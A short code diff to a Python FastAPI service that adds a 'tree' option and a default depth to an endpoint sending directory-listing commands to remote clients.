@@ -118,7 +118,7 @@ def send_getfile_command(client_id: str, path: str) -> BasicResponse:
 
 
 @app.get("/dirlist")
-def send_dirlist_command(client_id: str, path: str, depth: Optional[int]) -> BasicResponse:
+def send_dirlist_command(client_id: str, path: str, tree: bool = True, depth: Optional[int] = None) -> BasicResponse:
     return make_command_request(
         SendCommandRequest(
             header=RequestHeader(
@@ -126,7 +126,8 @@ def send_dirlist_command(client_id: str, path: str, depth: Optional[int]) -> Bas
                 request_type=RequestType.SendCommand
             ),
             content=SendCommandContent(command=DirListCommand(parameters=DirListParameters(path=path,
-                                                                                           depth=depth)))
+                                                                                           depth=depth,
+                                                                                           tree=tree)))
         )
     )
 
